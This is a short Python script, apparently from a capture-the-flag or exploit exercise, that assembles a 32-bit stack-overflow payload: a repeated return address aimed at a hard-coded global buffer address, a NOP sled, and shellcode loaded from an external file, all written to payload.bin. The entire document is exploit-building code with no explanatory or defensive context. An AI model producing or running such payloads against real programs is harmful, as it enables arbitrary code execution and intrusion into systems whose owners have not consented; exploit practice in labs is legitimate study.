import struct

global_buffer = 0x804a060

payload  = struct.pack('<I', global_buffer + 100) * 10
payload += b'\x90' * 200 # nop
payload += open('shellcode32.bin', 'rb').read()
payload += b'\n'

open('payload.bin', 'wb').write(payload)
